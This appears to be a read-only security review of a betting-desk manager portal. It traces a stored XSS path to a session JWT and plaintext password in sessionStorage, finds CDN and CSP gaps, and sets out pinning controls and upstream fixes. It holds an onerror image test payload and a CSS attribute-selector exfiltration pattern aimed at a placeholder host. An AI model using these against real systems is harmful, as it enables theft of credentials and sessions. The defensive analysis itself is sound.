# Manager portal client-side exposure — 2026-11-03

Three independent ways to reach the same prize: the Manager portal stores the session's Bearer JWT
(and, notably, the plaintext password) in `sessionStorage`, and any script running in the portal
origin can read it. Two paths are client code served by the vendor; the third is the CDN that code
loads. **All observations below are read-only.** No credential was used, no request was mutated,
and no exploit was fired.

Measured 2026-11-03 between 20:30 and 20:50 America/Chicago by fetching the public document and
its assets with an unauthenticated client. The controller bundle is the one this repo already pins:
`verification/manager-boot-oracle/pinned/manager.js`, sha256
`82c3d4ec9b5d0531b06219761f0b40db20bf07f4f4250eacdabf527e90e01937`, 100,121 bytes — re-fetched live
during this measurement and byte-identical to the pin. The vendor moved the shell to **1.0.281**
during the measurement (`setting/version.js` changed; `manager.js`, `util.js`, `security.js` did not),
and the oracle pin records that delta.

## 1. Path #1 — stored XSS in the hierarchy search (player → agent browser)

The player list is rendered by string concatenation, not by DOM text assignment. In
`manager.js` (`pinned/manager.js`, byte offsets are into that pinned file):

| Step      | Location                                    | What it does                                                                                         |
| --------- | ------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Source    | 60833                                       | `getCompleteHeriarchy` success: `players = e.PLAYERS` (the `getListAgenstByAgent` envelope)          |
| Sink      | 80222 (player branch), 79957 (`all` branch) | `p = "<span>" + e[s].NameFirst.toString().trim() + "</span> "`                                       |
| Execution | 82730                                       | `n.html(e.join(""))` — jQuery `.html()` parses and runs the markup                                   |
| Trigger   | 79957–80222 area                            | a row renders when the typed term is a substring of `customerID`, `Login`, `Password` or `NameFirst` |

`NameFirst` is interpolated raw; `Password` is too (`data-pass`, and visible in the dropdown). There
is no sanitizer in `manager.js`, `util.js` or `security.js` (grep: zero `sanitize` / `escapeHtml` /
`DOMPurify` / `stripTags`). A player who sets `NameFirst` to an image with an `onerror` handler
executes script in the agent's portal origin when the agent searches for that player (the attacker's
own login is a sufficient search term), and can then read:

- `sessionStorage.customerID` — read by the portal itself at boot (`manager.js` byte 1288);
- `sessionStorage.credentials` — written at login (`security.js` byte 16404) as
  `{"code": <Bearer JWT>, "redirect_uri": …, "password": <plaintext>, "customerID": …}`;
- `sessionStorage.credentials.code` — the token the portal re-reads in `verifySession`
  (`security.js` byte 19667) and sends as `Authorization: Bearer`.

Impact is therefore not "act as agent" in the abstract: it is **full manager API access with the
agent's token, plus a reusable plaintext password**, and it survives the session if the password is
reused. The token store is `sessionStorage`, not a cookie (traced below), so `document.cookie` is
irrelevant and there is no cookie CSRF surface to bring into the threat model.

**What this establishes:** the render sink, the data path and the absence of output encoding.
**What it does not establish:** that the player-facing profile update accepts markup in `NameFirst`.
No capture of that form exists in this repo; the write side is assumed, and if the server encodes or
rejects it the path is closed at the source.

### Credential store — why there is no CSRF surface

This is a negative result supporting §1, not a separate finding. Unauthenticated probes on
2026-11-03 and the recorded authenticated boot request (2026-11-01) agree: `POST /cloud/api/Manager/…`
without the header is **401 Authorization Required** from openresty, the authenticated request carries
the credential only as an `Authorization` header, and the only `Set-Cookie` on any response is
Cloudflare `__cf_bm` (bot management, `HttpOnly`). There is no session cookie and no CSRF header.

The credential path in the pinned `security.js` is:

| Byte          | What it does                                                                                           |
| ------------- | ------------------------------------------------------------------------------------------------------ |
| 16389         | `authenticate_normal` writes `sessionStorage.credentials = {code, redirect_uri, password, customerID}` |
| 17663 / 17739 | the M/A login branch also writes `sessionStorage.token`                                                |
| 19652         | `verifySession` hydrates `n.token = credentials.code` and starts the refresh interval                  |
| 20296         | `renewToken` refreshes `n.token` **in memory only** — it never writes storage                          |
| ~24422        | `$.ajaxPrefilter` reads `n.token` for `Authorization: Bearer`; no cookie participates                  |

No cookie is involved, so there is **no ambient authority for cross-site requests**: CSRF is not the
exposure and `n.csrf()` correctly returns `""` because there is nothing to return. The token is
JS-readable for the life of the tab, which makes §1's XSS the whole game and the client escaping seam
the primary control for it. Do not re-open this as a CSRF finding on the strength of a stale HAR.

## 2. Path #2 — the CDN trust root and a test stylesheet in production

`manager.html` is served unauthenticated, 200, and loads **86 distinct external assets** from four
origins: `cdn.fastassets.io` (most), `cdnjs.cloudflare.com` (2), `fonts.googleapis.com`,
`maps.googleapis.com`; plus `cdn.jsdelivr.net` for this repo's own docs page. Measured headers:

- The document sends **no `Content-Security-Policy`** (header and meta), no `X-Frame-Options`, no
  `X-Content-Type-Options`, no `Cache-Control` — HSTS only.
- **No `<script>` or `<link rel="stylesheet">` carries `integrity=`.** A swap at any of those origins
  executes on the next load for every agent; a poisoned copy can also outlive the origin fix because
  the CDN sends `ETag`/`Last-Modified` but no `Cache-Control`, so browsers cache heuristically.
- `cdn.fastassets.io/js/jquery.js` is **jQuery 1.11.0** (2014), served `application/octet-stream`,
  `ACAO: *`, no `nosniff`, no cache directives. Known-EOL versions carry CVE-2019-11358
  (prototype pollution) and CVE-2020-11022/11023 (`.html()` XSS); the §1 sink does not need them, but
  they widen the payload grammar.
- **`manager-test.less` is loaded by the production page** — `?v=109`, the newest rev, 302,941 bytes,
  1,666 selectors of which only 73 overlap `manager.less` (48,658 bytes, `?v=103`). It is loaded
  second, so it wins the cascade. That is a deploy-hygiene finding on its own and confirms the CDN is
  a mutable deploy target, not an immutable artifact store.
- `maps.googleapis.com/maps/api/js?…&key=<redacted>` sends **no ACAO**, so `integrity=` cannot be
  used there (a cross-origin SRI check is also a CORS check; the browser would block the script). The
  URL also carries a Google Maps browser key in public HTML — restrict it by referrer and rotate it;
  the value is deliberately redacted here and in the pin manifest.

CSS is not inert even without JavaScript: with no CSP, a stylesheet can exfiltrate DOM attribute
values with `[attr^="…"] { background: url(//host/…) }`. §1 puts the **player's password in the
`data-pass` attribute**, so a stylesheet compromise is a credential-exfiltration channel as agents
search. It cannot read `sessionStorage`, so the agent's JWT remains out of CSS reach. The current
`manager-test.less` contains no `[data-pass]`/`[data-login]` selectors — this is an ability, not an
observed leak.

## 3. What this repository now does about it

Detection for path #3, in the existing pin pattern:

- `verification/manager-boot-oracle/pinned/cdn-manifest.json` — 135 assets at vendor `1.0.281`:
  86 discovered from the live document, 4 explicit, and 45 same-origin `/app/` AMD modules. Each
  carries sha256, `sha384-…` SRI, byte count and provenance. The document set is discovered, so a
  **new** script is unpinned until reviewed and a **removed** one is reported stale.
- Same-origin `/app/` modules are pinned too (`sameOrigin: true`, fetched with the AMD loader's
  `?bust=<vendor version>`). The controller's `define`/`require` list is parsed from its pinned
  bytes, so a module the loader can reach is either pinned or reported as `app_module_unpinned` —
  the same gate logic on a different origin.
- `bun run pin:cdn` — fetch live bytes and compare; exit 1 on drift, 2 on an unreachable origin.
  `bun run pin:cdn:update --vendor-version <version>` — recompute and review the diff (human action,
  never CI). It refuses a byte change without a version bump; the review procedure is
  [cdn-pin-update.md](../runbooks/cdn-pin-update.md).
- Stylesheet-internal resources are compared, not just the tags: each `portal-css` pin records its
  resolved `url(...)`/`@import` targets, and the check reports `css_reference_drift`, so a swapped
  font or background that leaves the CSS bytes unchanged is visible. The offline gate cannot
  recompute these (no bytes); the live check does.
- `lib/f402_portal_drift_signal.ts` now includes the CDN assets, so `portal:drift:cron` /
  `portal:drift:cron --run-once` alerts on them; CI runs `pin:cdn` on the daily schedule, not on
  every PR, so vendor uptime cannot red ordinary builds.
- `bin/check-innerhtml.ts` — offline gate on tracked HTML: every external script/stylesheet must be
  pinned, carry the manifest's `integrity=`, and declare `crossorigin="anonymous"`; a tag whose
  origin sends no ACAO must **not** carry `integrity=`. It caught the previously unpinned Scalar
  bundle in `docs/index.html`, which is now in the manifest (its committed SRI matched the live
  bytes).
- `sri:apply` — rewrite a local document from the manifest so a hash cannot be hand-typed; the
  vendor patch is generated, not deployed (the live document is vendor-served).
- The two tracked Mini App pages now load `telegram.org/js/telegram-web-app.js` with its pinned SRI.
- `tests/f402_cdn_integrity.test.ts` covers the SHA-384 vector, extraction/normalization, the four
  rejection classes, rewrite behaviour, and that the tracked pages still pass the gate.

Client-side seam (this repository, rolling out):

- `client/overlay/security-seams.preload.js` — injected before page scripts over CDP
  (`Page.addScriptToEvaluateOnNewDocument`) on the Chrome backend. It decorates
  `system/security` on `requirejs.onResourceLoad` with **own properties only** (`escHtml`, `escUrl`,
  `csrf`, `sessionExpired`, `isAuthenticated`, `requireAuth`, `allowedModules`, `isAllowedModule`,
  `endSession`, `flags`); the prototype is untouched and no call site changes.
- `isAllowedModule` accepts a leaf or a full AMD id and gates the leaf; the allowlist is seeded from
  the pinned controller graph, so `message`, `total-active-customer` and the `customer-admin`
  submodules are covered. The gate fails if the pinned controller references a leaf the allowlist
  omits.
- **`system/security` exports a class, not a singleton** (measured live: `require("system/security")`
  is a function whose only own key is `extend`; consumers instantiate it). Decorating the export
  itself applied zero members to the singleton — the first live probe caught exactly that. The seam
  now adds non-enumerable prototype accessors; the first read on an instance materializes the member
  as a **non-enumerable, non-configurable own** property of that instance. Reading a seam on the
  prototype itself throws instead of silently converting the accessor into shared value state.
  `configurable: false` is intentional: seam removal is via the `?no-seam` kill switch or the
  `flags.externalViewGuard` gate, not by redefining a live instance's properties. If a future
  requirement genuinely needs live uninstall, that is a design change, not a flag flip. No
  `__proto__` assignment, no prototype pollution, and the decoration is retroactive for instances
  already created.
- `bun run probe:client-seams -- --profile <dir> [--login]` runs the probe on the live
  `manager.html?external-view=active&module=bet-ticker` page over Chrome/CDP (the wider exec mode is
  required where the sandbox blocks Chrome). Measured on an unauthenticated profile: preload
  installed, `system/security` loaded, **10/10 seam own properties present**, `appliedCount: 1` via
  the registry sweep, `csrf: ""` reported dormant with its reason, and `isAuthenticated() === false`
  (correct for no session). The probe reports `structural: pass, authenticated: unverified` and exits
  **2**, not 1: the seam is structurally verified, the session path is not.
- Probe exit contract: **0** covered + authenticated + clean · **1** structural failure · **2**
  structural pass, authenticated unverified · **3** not covered (WebKit) · **4** could not run.
  The `external-view` fix is accepted only on exit **0**, and exit 0 additionally requires the
  post-fix render target: run
  `bun run probe:client-seams -- --profile <dir> --login --expect-rendered '[data-wager-number]'`.
  Exit 0 means seam installed, session authenticated, **and bet-ticker rows present**; exit 2 means
  the session could not be verified, so the canary does not open. A visual check that rows render is
  still recommended for the first canary session; the selector is the automated acceptance, not a
  replacement for seeing the desk ticker populate.
- Registry degradation is an audit signal, not a page break: if RequireJS drops the private
  `requirejs.s.contexts` API the sweep records `registryDegraded` and the probe reports it in the
  notes; the `onResourceLoad` path still applies.
- `flags` carries the phase-1 canary gate: `{ unifiedPost: false, externalViewGuard: <latched> }`.
  The value is latched at preload from `?external-view-guard=1` or an injected
  `window.__F402_EXTERNAL_VIEW_GUARD__ = true`; default is `false`. Enabling is per-session and takes
  effect on the next navigation; rollback is opening the page **without** the parameter — no code
  change and no redeploy. (The held call-site fix reads `n.flags.externalViewGuard`.)
  The authenticated bet-ticker run is blocked in this environment: the login path has no keychain
  entry (`MissingF402CredentialsError`), and the bootstrapped profile does not settle under
  automation. See the Option B decision below.
- The kill switch `?no-seam` is latched into `window.__F402_SEAM_DISABLED__` at preload time and read
  from that global at decoration time, so a page that rewrites its URL cannot re-enable the seam.
- `probeSecuritySeams` asserts own properties, every controller leaf, and `isAuthenticated()` on the
  booted page; it **reports `csrf` as dormant and why**, and it returns `covered: false` on WebKit
  instead of passing.
- **WebKit is not covered; the recorded ratio does not measure user distribution.** Measured
  2026-11-03: 53 provenance records in tracked evidence carry a `backend` field, but they resolve to
  **two distinct WebKit probe-runs** (`2026-11-01T04:18:16Z` and `04:19:29Z`, `authMode: env-login`)
  whose per-capture files, edge-store copies and manifests repeat the same field; the only `chrome`
  entry there is in `cf_ray_ledger.json`, and the boot HAR is Chrome. The earlier "50 webkit : 3
  chrome" reading was **an artifact count, not a session count** and must not be used as a coverage
  percentage. Current tooling defaults to Chrome (`scripts/capture/webview.ts`), and there is no
  telemetry on which browser agents use, so phase-1 reach is **unknown** until a backend census is
  run. What is certain: Bun.WebView has no preload/interception hook and WebKit has no `cdp()`, so
  any WebKit session keeps the `external-view` bypass after the Chrome fix lands, and the probe
  returns `covered: false` there. **On WebKit, both `data-pass` and the bet-ticker bypass remain
  open** — top of the upstream ticket. Scope the WebKit injection path with a real backend census
  (`scripts/capture/*` provenance `startedAt` + `backend`, not file counts), not with this ratio.
- **Held: the `external-view` call site (phase-1 demonstration, Chrome only).** `manager.js`
  `setAccountInfo` runs `require(["manager/module/" + dataUrl("module")])` on a URL parameter with no
  auth check. The four-line fix (`isAuthenticated` guard → `isAllowedModule(mod)` → reject, else
  unchanged) is specified but not applied. Decision for the hold: **Option B — flag-gated canary.**
  The guard ships behind `flags.externalViewGuard` (default `false`); acceptance is a probe exit
  **0** on a logged-in profile on the bet-ticker page **with `--expect-rendered
'[data-wager-number]'` matching**, then enable on one canary instance by opening it with
  `?external-view-guard=1`. If the
  session check misfires on the load-bearing bet-ticker path, flip the flag and revert without a
  redeploy. This environment cannot authenticate, so "wait for auth" is not a plan; code-review-only
  sign-off plus a named canary is the bounded path. **The bypass remains open on Chrome until the
  canary runs, and on WebKit unconditionally.**

Limits, stated so nobody relies on a control that does not exist:

- **`rel="stylesheet/less"` cannot carry SRI.** Browsers only honor `integrity=` on
  `<link rel="stylesheet">` and `<script>`; less.js fetches the `.less` files over XHR and compiles
  them. For those three files the pin manifest is the only control until the vendor precompiles to
  `.css`.
- **`maps.googleapis.com` cannot carry SRI** (no ACAO). It is hash-pinned for drift only.
- **`telegram-web-app.js` is an unversioned, moving URL.** SRI now fails closed when Telegram
  changes it; the durable alternative is to self-host a reviewed copy. This trade-off is deliberate
  and reversible.
- Pinning is detection. It does not stop a bad asset from being served; it makes the swap visible.
- `/app/` module pinning follows the controller's static `require([...])` lists. A module loaded
  only through string concatenation (for example the `external-view` path's
  `require(["manager/module/" + name])`) cannot be enumerated from bytes; it is covered by the
  module-allowlist seam, not by the pin gate.
- CSS-internal targets are recorded and diffed, not pinned byte-for-byte. A new font/image host is
  visible at the next check, not blocked by it.

## 4. Upstream actions (not this repository's to deploy)

Two of these are a different kind of control from §3. Removing `data-pass` fixes the exposure; a
document CSP decides whether an injected script can run at all. Pin + SRI answers "did the asset
change" and "should the browser execute it" — neither stops an inline payload, an inline handler or a
`javascript:` URL from executing. CSP is complementary to SRI, not part of the supply-chain section (§2).

| Pri | Action                                                                                                            | Why                                                           |
| --- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| P0  | **A.** Remove `Password` from the API response and `data-pass`/the password span from the DOM; escape `NameFirst` | Root cause of path #1; pinning does not fix it                |
| P0  | **B.** Add the CSP header below to `manager.html`                                                                 | The missing half: decides whether injected script runs at all |
| P0  | Add `integrity=` + `crossorigin="anonymous"` to every CDN script/stylesheet (manifest-provided)                   | Prevention for path #2 (CDN), where ACAO allows it            |
| P0  | Delete `manager-test.less` from the production bucket and page                                                    | 302 KB test artifact in the critical path                     |
| P1  | Precompile the three `.less` files to `.css` and drop `less.js`                                                   | Only way to get SRI on the stylesheets                        |
| P1  | Upgrade jQuery 1.11.0; restrict/rotate the Maps browser key; move the JWT out of `sessionStorage`                 | EOL library, exposed key, script-readable token               |
| P2  | Self-host `telegram-web-app.js` instead of SRI-pinning a moving URL                                               | Removes a third-party load from the Mini App                  |

### P0-A — remove the credential from the response, not only the sink

The server and client changes are separate; doing only the second leaves the credential exposed.

**Server** (response builder for `searchCustomerAdmin` / `getListAgenstByAgent` — names are the
vendor's): drop `Password` from every `PLAYERS` row before serialization, or return a `HasPassword`
boolean if the UI needs the affordance. `NameFirst` is a display field and may stay, but it is
rendered client-side and must be escaped there.

**Client** (`manager.js`, `searchComponent`, player/all branches at bytes 79957–80222): delete the
`data-pass="…"` attribute and the `(password)` span from the result `<li>`, and render `NameFirst`
with `$("<span>").text(nameFirst)` or `textContent` instead of the string concatenation. Replace
`n.html(e.join(""))` (byte 82730) with DOM construction (`createElement` / `textContent` / `append`).

Why both: escaping `NameFirst` stops path #1 but leaves plaintext player passwords in transit and in
the DOM, visible to every agent and exfiltratable by a stylesheet (§2). Only removing them from the
response fixes the exposure. Escaping stays required for every field that remains.

Verification: a `NameFirst` of `<img src=x onerror=…>` renders as literal text and produces no
request; the response body contains no `Password`; the dropdown has no `data-pass`.

### P0-B — the CSP header `manager.html` currently lacks

The document sends no `Content-Security-Policy` header and no `<meta>` equivalent, so path #1's
payload — and any inline handler or `javascript:` URL — executes with no violation to report. The
target header, shaped by the assets the page loads today:

```http
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.fastassets.io https://cdnjs.cloudflare.com
             https://maps.googleapis.com 'sha256-<inline-script>';
  style-src 'self' 'unsafe-inline' https://cdn.fastassets.io
            https://fonts.googleapis.com;
  font-src 'self' data: https://cdn.fastassets.io https://fonts.gstatic.com;
  img-src 'self' data: https://cdn.fastassets.io;
  connect-src 'self' https://cdn.fastassets.io https://maps.googleapis.com;
  frame-ancestors 'none';
  base-uri 'self';
  object-src 'none';
  form-action 'self';
  report-to csp-endpoint
```

Migration, in order:

1. Deploy as `Content-Security-Policy-Report-Only` with a reporting endpoint; fix what it reports.
2. Hash each inline `<script>` block into `script-src`. Hashes cover script blocks only.
3. Inline event handlers (`onclick=…`) and `javascript:` URLs cannot be hashed. Convert them to
   `addEventListener`/delegated listeners before dropping `'unsafe-inline'` from `script-src`; if the
   backlog is large, `'unsafe-hashes'` with per-handler hashes is the interim — not `'unsafe-inline'`.
   `'unsafe-inline'` in `style-src` is accepted for now: the `<style>` blocks and inline style
   attributes need a separate refactor.
4. `frame-ancestors 'none'` matters on its own: the document has no `X-Frame-Options` either, so it
   can currently be framed.
5. Keep SRI after CSP lands. CSP stops injected inline script; SRI stops a swapped asset. Neither
   substitutes for the other.

Success checks: the header is present on `manager.html` itself (not only on API responses); an inline
handler on a test page is blocked; a normal session produces no legitimate violations in the report.

## Merge preconditions

- **CI precondition resolved (was external red).** `tests/gslive_report_columns.test.ts` briefly
  imported `labelsFor`, which `lib/gslive_report_columns.ts` no longer exported (introduced by
  `a102219`). That was proved on a clean `origin/main` worktree (753 files, that single error) and
  tracked as issue [#14](https://github.com/bw496915-cmyk/Sports-desk-ops/issues/14), owner
  **gslive workstream (@bw496915-cmyk)**, task `RT-GSLIVE-TYPECHECK` in `docs/REMAINING_TASKS.md`.
  It was fixed on `main` by `5413ade`; full `bun run typecheck` is green (771 files), the pre-push
  gate passed on `5413ade..820ed43`, and issue #14 is closed. No client/seam merge precondition
  remains from this break.
- **Authenticated bet-ticker probe (exit 0 + render selector).** The canary does not open until a
  logged-in profile produces exit 0; this environment has no credentials. Merge of the held
  `external-view` guard is conditioned on that, not on code review alone.

## What this does not establish

This is a client-code and asset review, not a full portal audit. The player-facing write path in
§1 is assumed, not captured. No credential was used and no exploit was executed, so the claims are
about reachable code and pinned bytes, not about a successful takeover. Server-side behaviour
(gateway rules, WAF, response sanitization) was not tested beyond the unauthenticated probes in §1.
The seam's authenticated path is **unverified** here: the live probe ran without a session, so
`isAuthenticated() === true` on the bet-ticker page has not been demonstrated, and the
`external-view` fix stays behind its flag until it is.
